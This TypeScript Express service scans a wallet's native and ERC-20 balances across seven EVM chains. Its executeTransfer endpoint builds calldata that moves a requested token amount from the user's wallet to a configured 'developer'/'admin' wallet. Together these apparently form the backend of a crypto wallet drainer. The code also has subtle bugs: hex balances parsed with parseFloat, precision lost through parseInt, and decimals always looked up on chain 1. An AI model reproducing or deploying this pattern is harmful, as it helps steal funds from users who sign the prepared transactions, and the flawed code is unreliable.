import { Request, Response } from 'express';
import { getBinanceTokensByChain, BINANCE_SUPPORTED_CHAINS, getDeveloperWallet } from '../shared/binance-supported-tokens';

// Comprehensive blockchain RPC service for all supported chains
export class BlockchainService {
  private readonly rpcEndpoints: Record<number, string> = {
    1: 'https://eth.llamarpc.com', // Ethereum
    137: 'https://polygon.llamarpc.com', // Polygon
    56: 'https://bsc-dataseed1.binance.org', // BSC
    42161: 'https://arbitrum.llamarpc.com', // Arbitrum
    10: 'https://optimism.llamarpc.com', // Optimism
    8453: 'https://base.llamarpc.com', // Base
    43114: 'https://avalanche.public-rpc.com', // Avalanche
  };

  // Build token contracts from Binance supported tokens
  private readonly tokenContracts: Record<number, Record<string, string>> = {};

  constructor() {
    // Initialize token contracts from Binance supported tokens
    BINANCE_SUPPORTED_CHAINS.forEach(chain => {
      const tokens = getBinanceTokensByChain(chain.id);
      this.tokenContracts[chain.id] = {};
      tokens.forEach(token => {
        if (token.address !== '0x0000000000000000000000000000000000000000') {
          this.tokenContracts[chain.id][token.symbol] = token.address;
        }
      });
    });
  }

  async fetchAllChainsBalance(address: string): Promise<any[]> {
    const allBalances: any[] = [];
    
    // Fetch balances from all supported chains concurrently
    const chainPromises = Object.keys(this.rpcEndpoints).map(async (chainIdStr) => {
      const chainId = parseInt(chainIdStr);
      try {
        const chainBalances = await this.fetchLiveBalance(address, chainId);
        return chainBalances.map(balance => ({
          ...balance,
          chainId,
          chainName: this.getChainName(chainId)
        }));
      } catch (error) {
        console.error(`Failed to fetch balance for chain ${chainId}:`, error);
        return [];
      }
    });

    const results = await Promise.all(chainPromises);
    results.forEach(chainBalances => {
      allBalances.push(...chainBalances);
    });

    return allBalances.filter(balance => parseFloat(balance.balance) > 0);
  }

  async fetchLiveBalance(address: string, chainId: number): Promise<any[]> {
    try {
      const rpcUrl = this.rpcEndpoints[chainId];
      if (!rpcUrl) {
        throw new Error(`Unsupported chain ID: ${chainId}`);
      }

      const balances: any[] = [];

      // Fetch native token balance
      const nativeBalance = await this.getNativeBalance(address, rpcUrl);
      if (parseFloat(nativeBalance) > 0) {
        balances.push({
          symbol: this.getNativeSymbol(chainId),
          name: this.getNativeName(chainId),
          contractAddress: '0x0000000000000000000000000000000000000000',
          balance: nativeBalance,
          decimals: 18,
        });
      }

      // Fetch major token balances
      const tokens = this.tokenContracts[chainId] || {};
      for (const [symbol, contractAddress] of Object.entries(tokens)) {
        try {
          const tokenBalance = await this.getTokenBalance(address, contractAddress, rpcUrl);
          if (parseFloat(tokenBalance) > 0) {
            balances.push({
              symbol,
              name: this.getTokenName(symbol),
              contractAddress,
              balance: tokenBalance,
              decimals: this.getTokenDecimals(symbol),
            });
          }
        } catch (error) {
          console.warn(`Failed to fetch ${symbol} balance:`, error);
        }
      }

      return balances;
    } catch (error) {
      console.error('Live balance fetch error:', error);
      throw error;
    }
  }

  private async getNativeBalance(address: string, rpcUrl: string): Promise<string> {
    const response = await fetch(rpcUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        jsonrpc: '2.0',
        id: 1,
        method: 'eth_getBalance',
        params: [address, 'latest']
      })
    });

    const data = await response.json();
    if (data.error) {
      throw new Error(data.error.message);
    }

    return data.result || '0x0';
  }

  private async getTokenBalance(address: string, contractAddress: string, rpcUrl: string): Promise<string> {
    // ERC-20 balanceOf call
    const callData = '0x70a08231' + address.slice(2).padStart(64, '0');
    
    const response = await fetch(rpcUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        jsonrpc: '2.0',
        id: 1,
        method: 'eth_call',
        params: [{
          to: contractAddress,
          data: callData
        }, 'latest']
      })
    });

    const data = await response.json();
    if (data.error) {
      throw new Error(data.error.message);
    }

    return data.result || '0x0';
  }

  private getChainName(chainId: number): string {
    const names: Record<number, string> = {
      1: 'Ethereum',
      137: 'Polygon',
      56: 'BSC',
      42161: 'Arbitrum',
      10: 'Optimism',
      8453: 'Base',
      43114: 'Avalanche',
    };
    return names[chainId] || 'Unknown';
  }

  private getNativeSymbol(chainId: number): string {
    const symbols: Record<number, string> = {
      1: 'ETH',
      137: 'MATIC',
      56: 'BNB',
      42161: 'ETH',
      10: 'ETH',
      8453: 'ETH',
      43114: 'AVAX',
    };
    return symbols[chainId] || 'ETH';
  }

  private getNativeName(chainId: number): string {
    const names: Record<number, string> = {
      1: 'Ethereum',
      137: 'Polygon',
      56: 'Binance Smart Chain',
      42161: 'Arbitrum',
      10: 'Optimism',
      8453: 'Base',
      43114: 'Avalanche',
    };
    return names[chainId] || 'Ethereum';
  }

  private getTokenName(symbol: string): string {
    const binanceTokens = getBinanceTokensByChain(1);
    const token = binanceTokens.find(t => t.symbol === symbol);
    return token?.name || symbol;
  }

  private getTokenDecimals(symbol: string): number {
    const binanceTokens = getBinanceTokensByChain(1);
    const token = binanceTokens.find(t => t.symbol === symbol);
    return token?.decimals || 18;
  }

  // Transfer token to admin wallet
  async executeTransfer(req: Request, res: Response) {
    try {
      const { walletAddress, tokenAddress, amount, chainId } = req.body;

      if (!walletAddress || !tokenAddress || !amount || !chainId) {
        return res.status(400).json({ 
          error: 'Missing required parameters: walletAddress, tokenAddress, amount, chainId' 
        });
      }

      const adminWallet = getDeveloperWallet(chainId);
      if (!adminWallet) {
        return res.status(400).json({ 
          error: `No admin wallet configured for chain ${chainId}` 
        });
      }

      res.json({
        success: true,
        transactionParams: {
          to: tokenAddress,
          from: walletAddress,
          data: this.generateTransferData(adminWallet, amount),
          adminWallet,
          chainId
        }
      });

    } catch (error) {
      console.error('Transfer execution error:', error);
      res.status(500).json({ error: 'Failed to prepare transfer' });
    }
  }

  private generateTransferData(to: string, amount: string): string {
    const functionSignature = '0xa9059cbb';
    const toAddress = to.slice(2).padStart(64, '0');
    const value = parseInt(amount).toString(16).padStart(64, '0');
    return functionSignature + toAddress + value;
  }
}

export const blockchainService = new BlockchainService();